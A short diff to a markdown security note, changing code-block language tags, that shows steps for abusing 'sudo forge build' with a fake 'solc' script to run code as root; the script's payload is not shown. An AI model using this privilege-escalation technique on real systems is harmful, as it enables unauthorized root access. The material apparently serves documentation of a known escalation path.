@@ -18,13 +18,13 @@
 
 #### Create Project
 
-```c
+```console
 $ forge init /PATH/TO/FOLDER/<FOLDER> --no-git --offline
 ```
 
 #### Malicious Solidity Compiler (solc)
 
-```c
+```bash
 #!/bin/bash
 if [[ $1 == "--version" ]]; then
     echo "solc, the solidity compiler"
@@ -39,12 +39,12 @@ fi
 
 #### Set Permission
 
-```c
+```console
 $ chmod 777 solc
 ```
 
 #### Execution
 
-```c
+```console
 $ sudo forge build --use /PATH/TO/FILE/solc
 ```
